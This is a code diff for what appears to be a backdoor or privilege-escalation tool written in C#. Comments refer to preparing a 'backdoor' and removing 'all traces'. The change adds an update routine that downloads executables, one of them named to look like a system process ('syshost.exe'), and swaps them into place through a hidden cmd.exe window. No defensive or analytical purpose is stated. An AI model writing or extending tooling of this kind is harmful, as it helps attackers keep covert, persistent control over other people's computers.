@@ -444,6 +444,20 @@ if($r-eq 0){
         Console.WriteLine("\n[+] Uninstall complete. All traces removed.");
     }
 
+    static void Update()
+    {
+        Console.WriteLine("[*] Downloading latest priv.exe...");
+        string tmp = Path.Combine(Path.GetTempPath(), "priv_update.exe");
+        if (!Download("priv.exe", tmp)) return;
+        Console.WriteLine("[*] Downloading latest syshost.exe...");
+        if (!Download("syshost.exe", Path.Combine(InstallDir, "syshost.exe"))) return;
+        string installed = Path.Combine(InstallDir, "priv.exe");
+        string cmd = $"/c ping -n 2 127.0.0.1 >nul & move /Y \"{tmp}\" \"{installed}\"";
+        System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo(
+            "cmd.exe", cmd){CreateNoWindow=true, UseShellExecute=false});
+        Console.WriteLine("[+] Update applied. Open a new cmd to use the latest version.");
+    }
+
     /* Stage 1 only, fast re-prep for backdoor */
     static void Prep()
     {
@@ -461,6 +475,7 @@ if($r-eq 0){
         string mode = args.Length>0 ? args[0].ToLower() : "";
 
         if (mode=="install") { Install(); return; }
+        if (mode=="update")  { Update(); return; }
         if (mode=="--unpriv" || mode=="unpriv") { Uninstall(); return; }
         if (mode=="--prep")  { Prep(); return; }
 
